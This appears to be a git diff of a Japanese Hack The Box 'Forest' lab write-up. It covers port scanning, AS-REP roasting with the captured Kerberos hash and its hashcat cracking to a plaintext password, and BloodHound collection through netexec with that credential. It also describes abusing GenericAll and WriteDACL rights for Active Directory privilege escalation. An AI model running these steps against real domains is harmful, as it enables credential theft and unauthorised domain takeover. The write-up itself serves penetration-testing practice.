@@ -2,7 +2,7 @@ https://app.hackthebox.com/machines/Forest
 
 ## STEP 1
 ```sh
-└─$ rustscan -a 10.129.95.210 --scripts none
+└─$ rustscan -a 10.129.95.210 --scripts none   
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -12,40 +12,51 @@ ________________________________________
 : http://discord.skerritt.blog         :
 : https://github.com/RustScan/RustScan :
  --------------------------------------
-Scanning ports: The virtual equivalent of knocking on doors.
+RustScan: Where '404 Not Found' meets '200 OK'.
 
 [~] The config file is expected to be at "/home/kali/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.129.95.210:53
 Open 10.129.95.210:88
+Open 10.129.95.210:135
+Open 10.129.95.210:139
+Open 10.129.95.210:389
+Open 10.129.95.210:445
+Open 10.129.95.210:464
 Open 10.129.95.210:593
 Open 10.129.95.210:636
-Open 10.129.95.210:3269
 Open 10.129.95.210:3268
+Open 10.129.95.210:3269
 Open 10.129.95.210:5985
 Open 10.129.95.210:9389
 Open 10.129.95.210:47001
-Open 10.129.95.210:49665
-Open 10.129.95.210:49666
 Open 10.129.95.210:49668
 Open 10.129.95.210:49664
+Open 10.129.95.210:49666
+Open 10.129.95.210:49665
 Open 10.129.95.210:49671
-Open 10.129.95.210:49685
 Open 10.129.95.210:49680
 Open 10.129.95.210:49681
+Open 10.129.95.210:49685
 Open 10.129.95.210:49700
-10.129.95.210 -> [53,88,593,636,3269,3268,5985,9389,47001,49665,49666,49668,49664,49671,49685,49680,49681,49700]
+Open 10.129.95.210:49861
+10.129.95.210 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49668,49664,49666,49665,49671,49680,49681,49685,49700,49861]
 ```
 ```sh
-└─$ nmap -n -Pn -p53,88,593,636,3269,3268,5985,9389,47001,49665,49666,49668,49664,49671,49685,49680,49681,49700 10.129.95.210
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 08:31 EDT
+└─$ nmap -n -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49668,49664,49666,49665,49671,49680,49681,49685,49700,49861 10.129.95.210
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 21:51 EDT
 Nmap scan report for 10.129.95.210
-Host is up (0.51s latency).
+Host is up (0.76s latency).
 
 PORT      STATE SERVICE
 53/tcp    open  domain
 88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
 593/tcp   open  http-rpc-epmap
 636/tcp   open  ldapssl
 3268/tcp  open  globalcatLDAP
@@ -62,8 +73,9 @@ PORT      STATE SERVICE
 49681/tcp open  unknown
 49685/tcp open  unknown
 49700/tcp open  unknown
+49861/tcp open  unknown
 
-Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
+Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
 ```
 
 
@@ -115,7 +127,28 @@ LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 LDAP        10.129.95.210   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:b8ac6afe475d465388ca3af9cf81bcc3$562a9861d3d6a745f2cb236bf12aa287ca1c1f82b88e0a28b34f06e85a13f14545828fd51cfa1217285ce79f4944d1c69e892a291e64786906e07dbaab448dd28afe95cec0876e3876182146bc16c0f9c6fdc901cc671f31cbf2385c2181a15df1c57e7d5ec2e9a158a157ce9fd00470b2d0c7e5339070134e309a2f443e65022a13be2019095c9a3c8bdff97d5950e3f7fb41f39585eee3213d784cfd01953208af9e41915f7c3edf1fa999ad49a41614637dbc33f3a587a971312ea2c793cece327931ff0cae9bd1fe20b410d32edb147fc13458bf21c79024897c72463b118afca401a0e
 ```
-クラック成功！
+ハッシュ形式を確認し、クラック成功！
+```sh
+└─$ nth -f hash.txt 
+
+  _   _                           _____ _           _          _   _           _     
+ | \ | |                         |_   _| |         | |        | | | |         | |    
+ |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
+ | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
+ | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
+ \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|
+
+https://twitter.com/bee_sec_san
+https://github.com/HashPals/Name-That-Hash 
+    
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:b8ac6afe475d465388ca3af9cf81bcc3$562a9861d3d6a745f2cb236bf12aa287ca1c1f82b88e0a28b34f06e85a13f14545828fd51cfa1217285ce79f4944d1c69e892a291e64786906e07dbaab448dd28afe95cec0876e3876182146bc16c0f9c6fdc9
+01cc671f31cbf2385c2181a15df1c57e7d5ec2e9a158a157ce9fd00470b2d0c7e5339070134e309a2f443e65022a13be2019095c9a3c8bdff97d5950e3f7fb41f39585eee3213d784cfd01953208af9e41915f7c3edf1fa999ad49a41614637dbc33f3a587a971312ea2c793cece327931ff0cae9bd1
+fe20b410d32edb147fc13458bf21c79024897c72463b118afca401a0e
+
+Most Likely 
+Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory
+```
 ```sh
 └─$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
@@ -212,31 +245,17 @@ b52be94e8c18f9cdabcfb7709a922a97
 
 
 ## STEP 3
-bloodhoundを回す
+netexecでbloodhoundを回す
 ```sh
-└─$ bloodhound-python -c ALL -d htb.local -u svc-alfresco -p s3rvice -ns 10.129.191.172 --zip
-INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
-INFO: Found AD domain: htb.local
-INFO: Getting TGT for user
-WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
-INFO: Connecting to LDAP server: FOREST.htb.local
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 2 computers
-INFO: Connecting to LDAP server: FOREST.htb.local
-INFO: Found 32 users
-INFO: Found 76 groups
-INFO: Found 2 gpos
-INFO: Found 15 ous
-INFO: Found 20 containers
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: EXCH01.htb.local
-INFO: Querying computer: FOREST.htb.local
-INFO: Done in 02M 00S
+└─$ netexec ldap -d htb.local --dns-server 10.129.95.210 -u svc-alfresco -p s3rvice --bloodhound --collection All 10.129.95.210
+LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
+LDAP        10.129.95.210   389    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+LDAP        10.129.95.210   389    FOREST           Resolved collection methods: rdp, psremote, dcom, trusts, objectprops, container, localadmin, session, group, acl
+LDAP        10.129.95.210   389    FOREST           Done in 01M 58S
+LDAP        10.129.95.210   389    FOREST           Compressing output into /home/kali/.nxc/logs/FOREST_10.129.95.210_2025-07-11_213653_bloodhound.zip
 ```
 svc-alfresoの上位グループは、「EXCHANGE WINDOWS PERMISSIONS」グループに対して、GenericAllを持つ  
-「EXCHANGE WINDOWS PErMISSIONS」グループは「HTB.LOCAL」に対してWriteDACLを持つ
+「EXCHANGE WINDOWS PERMISSIONS」グループは「HTB.LOCAL」に対してWriteDACLを持つ
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Forest_01.png">  
 GenericAllを利用して、svc-alfrescoを「EXCHANGE WINDOWS PERMISSIONS」グループに追加できた
 ```sh
